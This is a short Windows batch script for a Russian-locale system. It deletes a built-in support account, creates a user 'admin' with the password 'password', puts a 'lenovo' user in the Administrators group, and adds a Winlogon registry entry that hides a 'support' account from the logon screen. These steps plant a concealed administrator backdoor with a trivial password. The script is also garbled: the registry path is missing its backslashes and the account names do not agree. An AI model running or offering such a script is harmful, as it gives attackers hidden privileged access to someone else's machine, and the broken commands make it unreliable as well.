@echo off
chcp 1251 
net user SUPPORT_388945a0 /delete 
net user admin password /add 
net localgroup Администраторы lenovo /add 
net localgroup Пользователи SUPPORT_388945a0 /del 
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
